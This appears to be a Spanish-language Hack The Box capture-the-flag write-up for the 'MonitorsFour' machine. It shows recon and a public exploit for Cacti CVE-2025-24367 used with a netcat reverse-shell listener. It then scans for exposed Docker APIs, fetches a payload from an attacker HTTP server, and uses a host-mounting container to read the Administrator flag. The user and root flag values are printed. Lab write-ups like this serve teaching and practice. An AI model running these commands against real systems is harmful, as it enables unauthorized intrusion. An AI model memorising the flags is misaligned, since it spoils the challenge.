---
layout: single
title: "HTB MonitorsFour - Writeup"
date: 2026-05-21
difficulty: Easy
operating_system: Windows
tags:
  - Web
  - CVE
  - Privilege Escalation
summary: "Explotación de Cacti vulnerable (CVE-2025-24367) para obtener acceso de usuario y posterior escalada a root mediante Docker API y contenedores."
---

## Información general

| Campo | Valor |
|-------|-------|
| Sistema operativo | Windows |
| Dificultad | Fácil |
| Tags | `Web`, `CVE`, `Privilege Escalation` |

## Reconocimiento

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -Pn 10.129.1.174 -oG allPorts
```

```bash
nmap -p80,5985 -sCV 10.129.1.174 -oN targeted
```

## Enumeración

```bash
whatweb http://monitorsfour.htb/
```

```bash
feroxbuster -u http://monitorsfour.htb -t 50
```

```bash
wfuzz -H "Host: FUZZ.monitorsfour.htb" --hc 404,403 -c --hh 138 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt http://monitorsfour.htb
```

![Reconocimiento](/images/writeups/monitorsfour/Pasted image 20260521120236.png)

```bash
curl -s http://cacti.monitorsfour.htb/cacti/cacti.sql -o cacti.sql
```

```bash
grep -i "INSERT INTO user" -n cacti.sql
```

## Explotación

```bash
curl http://monitorsfour.htb/user?token=0
```

```bash
# Credenciales obtenidas (censuradas)
# admin / [REDACTED]
# mwatson / [REDACTED]
# janderson / [REDACTED]
# dthompson / [REDACTED]
```

```bash
git clone https://github.com/SoftAndoWetto/CVE-2025-24367-PoC-Cacti.git
```

```bash
python3 exploit.py
```

```bash
# Interacción del exploit (censurada)
# Username: marcus
# Password: [REDACTED]
```

```bash
nc -nlvp 4444
```

## Credenciales de la base de datos (censuradas)

```bash
DB_PASS=[REDACTED]
DB_PASSWORD=[REDACTED]
```

## User Flag

```bash
cat user.txt
```

**Valor:** `9b3af7e5094c885ccfad7b115587df41`

## Escalada de privilegios

```bash
cat << 'EOF' > scan.sh
for i in $(seq 1 254); do
  ip="192.168.65.$i"
  timeout 1 bash -c "curl -s http://$ip:2375/version | grep -q 'ApiVersion'" 2>/dev/null && echo "[+] Docker API OPEN: $ip:2375"
 done
EOF
```

```bash
chmod +x scan.sh
./scan.sh
```

```bash
curl -s http://192.168.65.7:2375/images/json | grep -o '"RepoTags":\[[^]]*\]'
```

```json
{
  "Image": "alpine:latest",
  "Cmd": ["/bin/sh", "-c", "cat /mnt/host_root/Users/Administrator/Desktop/root.txt"],
  "HostConfig": {"Binds": ["/mnt/host/c:/mnt/host_root"]},
  "Tty": true,
  "OpenStdin": true
}
```

```bash
python3 -m http.server 8000
```

```bash
curl http://10.10.14.150:8000/payload.json -o /tmp/payload.json
```

```bash
curl -X POST -H "Content-Type: application/json" -d @/tmp/payload.json http://192.168.65.7:2375/containers/create?name=pwned
curl -X POST http://192.168.65.7:2375/containers/$(docker ps -aqf "name=pwned")/start
```

```bash
curl http://192.168.65.7:2375/containers/$(docker ps -aqf "name=pwned")/logs?stdout=true
```

```bash
cat /mnt/host_root/Users/Administrator/Desktop/root.txt
```

**Root Flag Valor:** `df398fa317da91fe096884185fc2edab`

## Conclusión

Se explotó la vulnerabilidad del Cacti (CVE‑2025‑24367) para obtener credenciales de usuario, luego se aprovechó una configuración errónea del Docker API para escalar a root y capturar la flag del sistema.
